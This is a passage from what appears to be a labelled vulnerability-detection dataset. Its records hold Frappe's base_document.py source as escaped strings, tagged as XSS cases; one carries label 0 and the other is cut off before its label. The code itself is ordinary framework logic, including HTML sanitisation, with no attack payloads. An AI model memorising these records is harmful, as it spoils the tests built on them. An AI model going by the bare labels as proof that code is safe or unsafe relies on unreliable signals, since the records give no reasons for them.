self.idx:\n\t\t\t\t\t\treference = _(\"{0}, Row {1}\").format(_(self.doctype), self.idx)\n\n\t\t\t\t\telse:\n\t\t\t\t\t\treference = \"{0} {1}\".format(_(self.doctype), self.name)\n\n\t\t\t\t\tfrappe.throw(_(\"{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}\")\\\n\t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))\n\n\tdef _validate_update_after_submit(self):\n\t\t# get the full doc with children\n\t\tdb_values = frappe.get_doc(self.doctype, self.name).as_dict()\n\n\t\tfor key in self.as_dict():\n\t\t\tdf = self.meta.get_field(key)\n\t\t\tdb_value = db_values.get(key)\n\n\t\t\tif df and not df.allow_on_submit and (self.get(key) or db_value):\n\t\t\t\tif df.fieldtype==\"Table\":\n\t\t\t\t\t# just check if the table size has changed\n\t\t\t\t\t# individual fields will be checked in the loop for children\n\t\t\t\t\tself_value = len(self.get(key))\n\t\t\t\t\tdb_value = len(db_value)\n\n\t\t\t\telse:\n\t\t\t\t\tself_value = self.get_value(key)\n\n\t\t\t\tif self_value != db_value:\n\t\t\t\t\tfrappe.throw(_(\"Not allowed to change {0} after submission\").format(df.label),\n\t\t\t\t\t\tfrappe.UpdateAfterSubmitError)\n\n\tdef _sanitize_content(self):\n\t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS.\n\n\t\t\t- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'\n\t\t\"\"\"\n\t\tif frappe.flags.in_install:\n\t\t\treturn\n\n\t\tfor fieldname, value in self.get_valid_dict().items():\n\t\t\tif not value or not isinstance(value, string_types):\n\t\t\t\tcontinue\n\n\t\t\tvalue = frappe.as_unicode(value)\n\n\t\t\tif (u\"<\" not in value and u\">\" not in value):\n\t\t\t\t# doesn't look like html so no need\n\t\t\t\tcontinue\n\n\t\t\telif \"<!-- markdown -->\" in value and not (\"<script\" in value or \"javascript:\" in value):\n\t\t\t\t# should be handled separately via the markdown converter function\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tsanitized_value = value\n\n\t\t\tif df and df.get(\"fieldtype\") in (\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\":\n\t\t\t\tsanitized_value = sanitize_email(value)\n\n\t\t\telif df and (df.get(\"ignore_xss_filter\")\n\t\t\t\t\t\tor (df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\")\n\t\t\t\t\t\tor df.get(\"fieldtype\") in (\"Attach\", \"Attach Image\", \"Barcode\")\n\n\t\t\t\t\t\t# cancelled and submit but not update after submit should be ignored\n\t\t\t\t\t\tor self.docstatus==2\n\t\t\t\t\t\tor (self.docstatus==1 and not df.get(\"allow_on_submit\"))):\n\t\t\t\tcontinue\n\n\t\t\telse:\n\t\t\t\tsanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')\n\n\t\t\tself.set(fieldname, sanitized_value)\n\n\tdef _save_passwords(self):\n\t\t'''Save password field values in __Auth table'''\n\t\tif self.flags.ignore_save_passwords is True:\n\t\t\treturn\n\n\t\tfor df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):\n\t\t\tif self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue\n\t\t\tnew_password = self.get(df.fieldname)\n\t\t\tif new_password and not self.is_dummy_password(new_password):\n\t\t\t\t# is not a dummy password like '*****'\n\t\t\t\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname)\n\n\t\t\t\t# set dummy password like '*****'\n\t\t\t\tself.set(df.fieldname, '*'*len(new_password))\n\n\tdef get_password(self, fieldname='password', raise_exception=True):\n\t\tif self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):\n\t\t\treturn self.get(fieldname)\n\n\t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)\n\n\tdef is_dummy_password(self, pwd):\n\t\treturn ''.join(set(pwd))=='*'\n\n\tdef precision(self, fieldname, parentfield=None):\n\t\t\"\"\"Returns float precision for a particular field (or get global default).\n\n\t\t:param fieldname: Fieldname for which precision is required.\n\t\t:param parentfield: If fieldname is in child table.\"\"\"\n\t\tfrom frappe.model.meta import get_field_precision\n\n\t\tif parentfield and not isinstance(parentfield, string_types):\n\t\t\tparentfield = parentfield.parentfield\n\n\t\tcache_key = parentfield or \"main\"\n\n\t\tif not hasattr(self, \"_precision\"):\n\t\t\tself._precision = frappe._dict()\n\n\t\tif cache_key not in self._precision:\n\t\t\tself._precision[cache_key] = frappe._dict()\n\n\t\tif fieldname not in self._precision[cache_key]:\n\t\t\tself._precision[cache_key][fieldname] = None\n\n\t\t\tdoctype = self.meta.get_field(parentfield).options if parentfield else self.doctype\n\t\t\tdf = frappe.get_meta(doctype).get_field(fieldname)\n\n\t\t\tif df.fieldtype in (\"Currency\", \"Float\", \"Percent\"):\n\t\t\t\tself._precision[cache_key][fieldname] = get_field_precision(df, self)\n\n\t\treturn self._precision[cache_key][fieldname]\n\n\n\tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):\n\t\tfrom frappe.utils.formatters import format_value\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif not df and fieldname in default_fields:\n\t\t\tfrom frappe.model.meta import get_default_df\n\t\t\tdf = get_default_df(fieldname)\n\n\t\tval = self.get(fieldname)\n\n\t\tif translated:\n\t\t\tval = _(val)\n\n\t\tif absolute_value and isinstance(val, (int, float)):\n\t\t\tval = abs(self.get(fieldname))\n\n\t\tif not doc:\n\t\t\tdoc = getattr(self, \"parent_doc\", None) or self\n\n\t\treturn format_value(val, df=df, doc=doc, currency=currency)\n\n\tdef is_print_hide(self, fieldname, df=None, for_print=True):\n\t\t\"\"\"Returns true if fieldname is to be hidden for print.\n\n\t\tPrint Hide can be set via the Print Format Builder or in the controller as a list\n\t\tof hidden fields. Example\n\n\t\t\tclass MyDoc(Document):\n\t\t\t\tdef __setup__(self):\n\t\t\t\t\tself.print_hide = [\"field1\", \"field2\"]\n\n\t\t:param fieldname: Fieldname to be checked if hidden.\n\t\t\"\"\"\n\t\tmeta_df = self.meta.get_field(fieldname)\n\t\tif meta_df and meta_df.get(\"__print_hide\"):\n\t\t\treturn True\n\n\t\tprint_hide = 0\n\n\t\tif self.get(fieldname)==0 and not self.meta.istable:\n\t\t\tprint_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )\n\n\t\tif not print_hide:\n\t\t\tif df and df.print_hide is not None:\n\t\t\t\tprint_hide = df.print_hide\n\t\t\telif meta_df:\n\t\t\t\tprint_hide = meta_df.print_hide\n\n\t\treturn print_hide\n\n\tdef in_format_data(self, fieldname):\n\t\t\"\"\"Returns True if shown via Print Format::`format_data` property.\n\t\t\tCalled from within standard print format.\"\"\"\n\t\tdoc = getattr(self, \"parent_doc\", self)\n\n\t\tif hasattr(doc, \"format_data_map\"):\n\t\t\treturn fieldname in doc.format_data_map\n\t\telse:\n\t\t\treturn True\n\n\tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):\n\t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\"\n\t\tto_reset = []\n\n\t\tfor df in high_permlevel_fields:\n\t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:\n\t\t\t\tto_reset.append(df)\n\n\t\tif to_reset:\n\t\t\tif self.is_new():\n\t\t\t\t# if new, set default value\n\t\t\t\tref_doc = frappe.new_doc(self.doctype)\n\t\t\telse:\n\t\t\t\t# get values from old doc\n\t\t\t\tif self.get('parent_doc'):\n\t\t\t\t\tself.parent_doc.get_latest()\n\t\t\t\t\tref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]\n\t\t\t\telse:\n\t\t\t\t\tref_doc = self.get_latest()\n\n\t\t\tfor df in to_reset:\n\t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname))\n\n\tdef get_value(self, fieldname):\n\t\tdf = self.meta.get_field(fieldname)\n\t\tval = self.get(fieldname)\n\n\t\treturn self.cast(val, df)\n\n\tdef cast(self, value, df):\n\t\treturn cast_fieldtype(df.fieldtype, value)\n\n\tdef _extract_images_from_text_editor(self):\n\t\tfrom frappe.utils.file_manager import extract_images_from_doc\n\t\tif self.doctype != \"DocType\":\n\t\t\tfor df in self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Text Editor\")}):\n\t\t\t\textract_images_from_doc(self, df.fieldname)\n\ndef _filter(data, filters, limit=None):\n\t\"\"\"pass filters as:\n\t\t{\"key\": \"val\", \"key\": [\"!=\", \"val\"],\n\t\t\"key\": [\"in\", \"val\"], \"key\": [\"not in\", \"val\"], \"key\": \"^val\",\n\t\t\"key\" : True (exists), \"key\": False (does not exist) }\"\"\"\n\n\tout, _filters = [], {}\n\n\tif not data:\n\t\treturn out\n\n\t# setup filters as tuples\n\tif filters:\n\t\tfor f in filters:\n\t\t\tfval = filters[f]\n\n\t\t\tif not isinstance(fval, (tuple, list)):\n\t\t\t\tif fval is True:\n\t\t\t\t\tfval = (\"not None\", fval)\n\t\t\t\telif fval is False:\n\t\t\t\t\tfval = (\"None\", fval)\n\t\t\t\telif isinstance(fval, string_types) and fval.startswith(\"^\"):\n\t\t\t\t\tfval = (\"^\", fval[1:])\n\t\t\t\telse:\n\t\t\t\t\tfval = (\"=\", fval)\n\n\t\t\t_filters[f] = fval\n\n\tfor d in data:\n\t\tadd = True\n\t\tfor f, fval in iteritems(_filters):\n\t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]):\n\t\t\t\tadd = False\n\t\t\t\tbreak\n\n\t\tif add:\n\t\t\tout.append(d)\n\t\t\tif limit and (len(out)-1)==limit:\n\t\t\t\tbreak\n\n\treturn out\n/n/n/n", "label": 0, "vtype": "xss"}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "/frappe/model/base_document.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\nfrom six import iteritems, string_types\nimport datetime\nimport frappe, sys\nfrom frappe import _\nfrom frappe.utils import (cint, flt, now, cstr, strip_html,\n\tsanitize_html, sanitize_email, cast_fieldtype)\nfrom frappe.model import default_fields\nfrom frappe.model.naming import set_new_name\nfrom frappe.model.utils.link_count import notify_link_count\nfrom frappe.modules import load_doctype_module\nfrom frappe.model import display_fieldtypes\nfrom frappe.model.db_schema import type_map, varchar_len\nfrom frappe.utils.password import get_decrypted_password, set_encrypted_password\n\n_classes = {}\n\ndef get_controller(doctype):\n\t\"\"\"Returns the **class** object of the given DocType.\n\tFor `custom` type, returns `frappe.model.document.Document`.\n\n\t:param doctype: DocType name as string.\"\"\"\n\tfrom frappe.model.document import Document\n\tglobal _classes\n\n\tif not doctype in _classes:\n\t\tmodule_name, custom = frappe.db.get_value(\"DocType\", doctype, (\"module\", \"custom\"), cache=True) \\\n\t\t\tor [\"Core\", False]\n\n\t\tif custom:\n\t\t\t_class = Document\n\t\telse:\n\t\t\tmodule = load_doctype_module(doctype, module_name)\n\t\t\tclassname = doctype.replace(\" \", \"\").replace(\"-\", \"\")\n\t\t\tif hasattr(module, classname):\n\t\t\t\t_class = getattr(module, classname)\n\t\t\t\tif issubclass(_class, BaseDocument):\n\t\t\t\t\t_class = getattr(module, classname)\n\t\t\t\telse:\n\t\t\t\t\traise ImportError(doctype)\n\t\t\telse:\n\t\t\t\traise ImportError(doctype)\n\t\t_classes[doctype] = _class\n\n\treturn _classes[doctype]\n\nclass BaseDocument(object):\n\tignore_in_getter = (\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\")\n\n\tdef __init__(self, d):\n\t\tself.update(d)\n\t\tself.dont_update_if_missing = []\n\n\t\tif hasattr(self, \"__setup__\"):\n\t\t\tself.__setup__()\n\n\t@property\n\tdef meta(self):\n\t\tif not hasattr(self, \"_meta\"):\n\t\t\tself._meta = frappe.get_meta(self.doctype)\n\n\t\treturn self._meta\n\n\tdef update(self, d):\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\n\t\t# first set default field values of base document\n\t\tfor key in default_fields:\n\t\t\tif key in d:\n\t\t\t\tself.set(key, d.get(key))\n\n\t\tfor key, value in iteritems(d):\n\t\t\tself.set(key, value)\n\n\t\treturn self\n\n\tdef update_if_missing(self, d):\n\t\tif isinstance(d, BaseDocument):\n\t\t\td = d.get_valid_dict()\n\n\t\tif \"doctype\" in d:\n\t\t\tself.set(\"doctype\", d.get(\"doctype\"))\n\t\tfor key, value in iteritems(d):\n\t\t\t# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value\n\t\t\tif (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):\n\t\t\t\tself.set(key, value)\n\n\tdef get_db_value(self, key):\n\t\treturn frappe.db.get_value(self.doctype, self.name, key)\n\n\tdef get(self, key=None, filters=None, limit=None, default=None):\n\t\tif key:\n\t\t\tif isinstance(key, dict):\n\t\t\t\treturn _filter(self.get_all_children(), key, limit=limit)\n\t\t\tif filters:\n\t\t\t\tif isinstance(filters, dict):\n\t\t\t\t\tvalue = _filter(self.__dict__.get(key, []), filters, limit=limit)\n\t\t\t\telse:\n\t\t\t\t\tdefault = filters\n\t\t\t\t\tfilters = None\n\t\t\t\t\tvalue = self.__dict__.get(key, default)\n\t\t\telse:\n\t\t\t\tvalue = self.__dict__.get(key, default)\n\n\t\t\tif value is None and key not in self.ignore_in_getter \\\n\t\t\t\tand key in (d.fieldname for d in self.meta.get_table_fields()):\n\t\t\t\tself.set(key, [])\n\t\t\t\tvalue = self.__dict__.get(key)\n\n\t\t\treturn value\n\t\telse:\n\t\t\treturn self.__dict__\n\n\tdef getone(self, key, filters=None):\n\t\treturn self.get(key, filters=filters, limit=1)[0]\n\n\tdef set(self, key, value, as_value=False):\n\t\tif isinstance(value, list) and not as_value:\n\t\t\tself.__dict__[key] = []\n\t\t\tself.extend(key, value)\n\t\telse:\n\t\t\tself.__dict__[key] = value\n\n\tdef delete_key(self, key):\n\t\tif key in self.__dict__:\n\t\t\tdel self.__dict__[key]\n\n\tdef append(self, key, value=None):\n\t\tif value==None:\n\t\t\tvalue={}\n\t\tif isinstance(value, (dict, BaseDocument)):\n\t\t\tif not self.__dict__.get(key):\n\t\t\t\tself.__dict__[key] = []\n\t\t\tvalue = self._init_child(value, key)\n\t\t\tself.__dict__[key].append(value)\n\n\t\t\t# reference parent document\n\t\t\tvalue.parent_doc = self\n\n\t\t\treturn value\n\t\telse:\n\n\t\t\t# metaclasses may have arbitrary lists\n\t\t\t# which we can ignore\n\t\t\tif (getattr(self, '_metaclass', None)\n\t\t\t\tor self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):\n\t\t\t\treturn value\n\n\t\t\traise ValueError(\n\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not {2} ({3})'.format(key,\n\t\t\t\t\tself.name, str(type(value))[1:-1], value)\n\t\t\t)\n\n\tdef extend(self, key, value):\n\t\tif isinstance(value, list):\n\t\t\tfor v in value:\n\t\t\t\tself.append(key, v)\n\t\telse:\n\t\t\traise ValueError\n\n\tdef remove(self, doc):\n\t\tself.get(doc.parentfield).remove(doc)\n\n\tdef _init_child(self, value, key):\n\t\tif not self.doctype:\n\t\t\treturn value\n\t\tif not isinstance(value, BaseDocument):\n\t\t\tif \"doctype\" not in value:\n\t\t\t\tvalue[\"doctype\"] = self.get_table_field_doctype(key)\n\t\t\t\tif not value[\"doctype\"]:\n\t\t\t\t\traise AttributeError(key)\n\t\t\tvalue = get_controller(value[\"doctype\"])(value)\n\t\t\tvalue.init_valid_columns()\n\n\t\tvalue.parent = self.name\n\t\tvalue.parenttype = self.doctype\n\t\tvalue.parentfield = key\n\n\t\tif value.docstatus is None:\n\t\t\tvalue.docstatus = 0\n\n\t\tif not getattr(value, \"idx\", None):\n\t\t\tvalue.idx = len(self.get(key) or []) + 1\n\n\t\tif not getattr(value, \"name\", None):\n\t\t\tvalue.__dict__['__islocal'] = 1\n\n\t\treturn value\n\n\tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False):\n\t\td = frappe._dict()\n\t\tfor fieldname in self.meta.get_valid_columns():\n\t\t\td[fieldname] = self.get(fieldname)\n\n\t\t\t# if no need for sanitization and value is None, continue\n\t\t\tif not sanitize and d[fieldname] is None:\n\t\t\t\tcontinue\n\n\t\t\tdf = self.meta.get_field(fieldname)\n\t\t\tif df:\n\t\t\t\tif df.fieldtype==\"Check\":\n\t\t\t\t\tif d[fieldname]==None:\n\t\t\t\t\t\td[fieldname] = 0\n\n\t\t\t\t\telif (not isinstance(d[fieldname], int) or d[fieldname] > 1):\n\t\t\t\t\t\td[fieldname] = 1 if cint(d[fieldname]) else 0\n\n\t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int):\n\t\t\t\t\td[fieldname] = cint(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Currency\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float):\n\t\t\t\t\td[fieldname] = flt(d[fieldname])\n\n\t\t\t\telif df.fieldtype in (\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\":\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\telif df.get(\"unique\") and cstr(d[fieldname]).strip()==\"\":\n\t\t\t\t\t# unique empty field should be set to None\n\t\t\t\t\td[fieldname] = None\n\n\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype != 'Table':\n\t\t\t\t\tfrappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))\n\n\t\t\t\tif convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):\n\t\t\t\t\td[fieldname] = str(d[fieldname])\n\n\t\treturn d\n\n\tdef init_valid_columns(self):\n\t\tfor key in default_fields:\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\t\t\tif key in (\"idx\", \"docstatus\") and self.__dict__[key] is None:\n\t\t\t\tself.__dict__[key] = 0\n\n\t\tfor key in self.get_valid_columns():\n\t\t\tif key not in self.__dict__:\n\t\t\t\tself.__dict__[key] = None\n\n\tdef get_valid_columns(self):\n\t\tif self.doctype not in frappe.local.valid_columns:\n\t\t\tif self.doctype in (\"DocField\", \"DocPerm\") and self.parent in (\"DocType\", \"DocField\", \"DocPerm\"):\n\t\t\t\tfrom frappe.model.meta import get_table_columns\n\t\t\t\tvalid = get_table_columns(self.doctype)\n\t\t\telse:\n\t\t\t\tvalid = self.meta.get_valid_columns()\n\n\t\t\tfrappe.local.valid_columns[self.doctype] = valid\n\n\t\treturn frappe.local.valid_columns[self.doctype]\n\n\tdef is_new(self):\n\t\treturn self.get(\"__islocal\")\n\n\tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):\n\t\tdoc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)\n\t\tdoc[\"doctype\"] = self.doctype\n\t\tfor df in self.meta.get_table_fields():\n\t\t\tchildren = self.get(df.fieldname) or []\n\t\t\tdoc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]\n\n\t\tif no_nulls:\n\t\t\tfor k in list(doc):\n\t\t\t\tif doc[k] is None:\n\t\t\t\t\tdel doc[k]\n\n\t\tif no_default_fields:\n\t\t\tfor k in list(doc):\n\t\t\t\tif k in default_fields:\n\t\t\t\t\tdel doc[k]\n\n\t\tfor key in (\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"):\n\t\t\tif self.get(key):\n\t\t\t\tdoc[key] = self.get(key)\n\n\t\treturn doc\n\n\tdef as_json(self):\n\t\treturn frappe.as_json(self.as_dict())\n\n\tdef get_table_field_doctype(self, fieldname):\n\t\treturn self.meta.get_field(fieldname).options\n\n\tdef get_parentfield_of_doctype(self, doctype):\n\t\tfieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]\n\t\treturn fieldname[0] if fieldname else None\n\n\tdef db_insert(self):\n\t\t\"\"\"INSERT the document (with valid columns) in the database.\"\"\"\n\t\tif not self.name:\n\t\t\t# name will be set by document class in most cases\n\t\t\tset_new_name(self)\n\n\t\tif not self.creation:\n\t\t\tself.creation = self.modified = now()\n\t\t\tself.created_by = self.modifield_by = frappe.session.user\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\tcolumns = list(d)\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}`\n\t\t\t\t({columns}) values ({values})\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tcolumns = \", \".join([\"`\"+c+\"`\" for c in columns]),\n\t\t\t\t\tvalues = \", \".join([\"%s\"] * len(columns))\n\t\t\t\t), list(d.values()))\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062:\n\t\t\t\tif \"PRIMARY\" in cstr(e.args[1]):\n\t\t\t\t\tif self.meta.autoname==\"hash\":\n\t\t\t\t\t\t# hash collision? try again\n\t\t\t\t\t\tself.name = None\n\t\t\t\t\t\tself.db_insert()\n\t\t\t\t\t\treturn\n\n\t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e)\n\n\t\t\t\telif \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\t\t# unique constraint\n\t\t\t\t\tself.show_unique_validation_message(e)\n\t\t\t\telse:\n\t\t\t\t\traise\n\t\t\telse:\n\t\t\t\traise\n\t\tself.set(\"__islocal\", False)\n\n\tdef db_update(self):\n\t\tif self.get(\"__islocal\") or not self.name:\n\t\t\tself.db_insert()\n\t\t\treturn\n\n\t\td = self.get_valid_dict(convert_dates_to_str=True)\n\n\t\t# don't update name, as case might've been changed\n\t\tname = d['name']\n\t\tdel d['name']\n\n\t\tcolumns = list(d)\n\n\t\ttry:\n\t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}`\n\t\t\t\tset {values} where name=%s\"\"\".format(\n\t\t\t\t\tdoctype = self.doctype,\n\t\t\t\t\tvalues = \", \".join([\"`\"+c+\"`=%s\" for c in columns])\n\t\t\t\t), list(d.values()) + [name])\n\t\texcept Exception as e:\n\t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]):\n\t\t\t\tself.show_unique_validation_message(e)\n\t\t\telse:\n\t\t\t\traise\n\n\tdef show_unique_validation_message(self, e):\n\t\ttype, value, traceback = sys.exc_info()\n\t\tfieldname, label = str(e).split(\"'\")[-2], None\n\n\t\t# unique_first_fieldname_second_fieldname is the constraint name\n\t\t# created using frappe.db.add_unique\n\t\tif \"unique_\" in fieldname:\n\t\t\tfieldname = fieldname.split(\"_\", 1)[1]\n\n\t\tdf = self.meta.get_field(fieldname)\n\t\tif df:\n\t\t\tlabel = df.label\n\n\t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname)))\n\n\t\t# this is used to preserve traceback\n\t\traise frappe.UniqueValidationError(self.doctype, self.name, e)\n\n\tdef update_modified(self):\n\t\t'''Update modified timestamp'''\n\t\tself.set(\"modified\", now())\n\t\tfrappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)\n\n\tdef _fix_numeric_types(self):\n\t\tfor df in self.meta.get(\"fields\"):\n\t\t\tif df.fieldtype == \"Check\":\n\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\telif self.get(df.fieldname) is not None:\n\t\t\t\tif df.fieldtype == \"Int\":\n\t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname)))\n\n\t\t\t\telif df.fieldtype in (\"Float\", \"Currency\", \"Percent\"):\n\t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname)))\n\n\t\tif self.docstatus is not None:\n\t\t\tself.docstatus = cint(self.docstatus)\n\n\tdef _get_missing_mandatory_fields(self):\n\t\t\"\"\"Get mandatory fields that do not have any values\"\"\"\n\t\tdef get_msg(df):\n\t\t\tif df.fieldtype == \"Table\":\n\t\t\t\treturn \"{}: {}: {}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label))\n\n\t\t\telif self.parentfield:\n\t\t\t\treturn \"{}: {} {} #{}: {}: {}\".format(_(\"Error\"), frappe.bold(_(self.doctype)),\n\t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label))\n\n\t\t\telse:\n\t\t\t\treturn _(\"Error: Value missing for {0}: {1}\").format(_(df.parent), _(df.label))\n\n\t\tmissing = []\n\n\t\tfor df in self.meta.get(\"fields\", {\"reqd\": ('=', 1)}):\n\t\t\tif self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():\n\t\t\t\tmissing.append((df.fieldname, get_msg(df)))\n\n\t\t# check for missing parent and parenttype\n\t\tif self.meta.istable:\n\t\t\tfor fieldname in (\"parent\", \"parenttype\"):\n\t\t\t\tif not self.get(fieldname):\n\t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname))))\n\n\t\treturn missing\n\n\tdef get_invalid_links(self, is_submittable=False):\n\t\t'''Returns list of invalid links and also updates fetch values if not set'''\n\t\tdef get_msg(df, docname):\n\t\t\tif self.parentfield:\n\t\t\t\treturn \"{} #{}: {}: {}\".format(_(\"Row\"), self.idx, _(df.label), docname)\n\t\t\telse:\n\t\t\t\treturn \"{}: {}\".format(_(df.label), docname)\n\n\t\tinvalid_links = []\n\t\tcancelled_links = []\n\n\t\tfor df in (self.meta.get_link_fields()\n\t\t\t\t+ self.meta.get(\"fields\", {\"fieldtype\": ('=', \"Dynamic Link\")})):\n\t\t\tdocname = self.get(df.fieldname)\n\n\t\t\tif docname:\n\t\t\t\tif df.fieldtype==\"Link\":\n\t\t\t\t\tdoctype = df.options\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field {0}\").format(df.fieldname))\n\t\t\t\telse:\n\t\t\t\t\tdoctype = self.get(df.options)\n\t\t\t\t\tif not doctype:\n\t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options)))\n\n\t\t\t\t# MySQL is case insensitive. Preserve case of the original docname in the Link Field.\n\n\t\t\t\t# get a map of values ot fetch along with this link query\n\t\t\t\t# that are mapped as link_fieldname.source_fieldname in Options of\n\t\t\t\t# Readonly or Data or Text type fields\n\n\t\t\t\tfields_to_fetch = [\n\t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname)\n\t\t\t\t\tif\n\t\t\t\t\t\tnot _df.get('fetch_if_empty')\n\t\t\t\t\t\tor (_df.get('fetch_if_empty') and not self.get(_df.fieldname))\n\t\t\t\t]\n\n\t\t\t\tif not fields_to_fetch:\n\t\t\t\t\t# cache a single value type\n\t\t\t\t\tvalues = frappe._dict(name=frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\t'name', cache=True))\n\t\t\t\telse:\n\t\t\t\t\tvalues_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]\n\t\t\t\t\t\tfor _df in fields_to_fetch]\n\n\t\t\t\t\t# don't cache if fetching other values too\n\t\t\t\t\tvalues = frappe.db.get_value(doctype, docname,\n\t\t\t\t\t\tvalues_to_fetch, as_dict=True)\n\n\t\t\t\tif frappe.get_meta(doctype).issingle:\n\t\t\t\t\tvalues.name = doctype\n\n\t\t\t\tif values:\n\t\t\t\t\tsetattr(self, df.fieldname, values.name)\n\n\t\t\t\t\tfor _df in fields_to_fetch:\n\t\t\t\t\t\tif self.is_new() or self.docstatus != 1 or _df.allow_on_submit:\n\t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])\n\n\t\t\t\t\tnotify_link_count(doctype, docname)\n\n\t\t\t\t\tif not values.name:\n\t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\t\t\t\telif (df.fieldname != \"amended_from\"\n\t\t\t\t\t\tand (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable\n\t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2):\n\n\t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname)))\n\n\t\treturn invalid_links, cancelled_links\n\n\tdef _validate_selects(self):\n\t\tif frappe.flags.in_import:\n\t\t\treturn\n\n\t\tfor df in self.meta.get_select_fields():\n\t\t\tif df.fieldname==\"naming_series\" or not (self.get(df.fieldname) and df.options):\n\t\t\t\tcontinue\n\n\t\t\toptions = (df.options or \"\").split(\"\\n\")\n\n\t\t\t# if only empty options\n\t\t\tif not filter(None, options):\n\t\t\t\tcontinue\n\n\t\t\t# strip and set\n\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip())\n\t\t\tvalue = self.get(df.fieldname)\n\n\t\t\tif value not in options and not (frappe.flags.in_test and value.startswith(\"_T-\")):\n\t\t\t\t# show an elaborate message\n\t\t\t\tprefix = _(\"Row #{0}:\").format(self.idx) if self.get(\"parentfield\") else \"\"\n\t\t\t\tlabel = _(self.meta.get_label(df.fieldname))\n\t\t\t\tcomma_options = '\", \"'.join(_(each) for each in options)\n\n\t\t\t\tfrappe.throw(_('{0} {1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label,\n\t\t\t\t\tvalue, comma_options))\n\n\tdef _validate_constants(self):\n\t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:\n\t\t\treturn\n\n\t\tconstants = [d.fieldname for d in self.meta.get(\"fields\", {\"set_only_once\": ('=',1)})]\n\t\tif constants:\n\t\t\tvalues = frappe.db.get_value(self.doctype, self.name, constants, 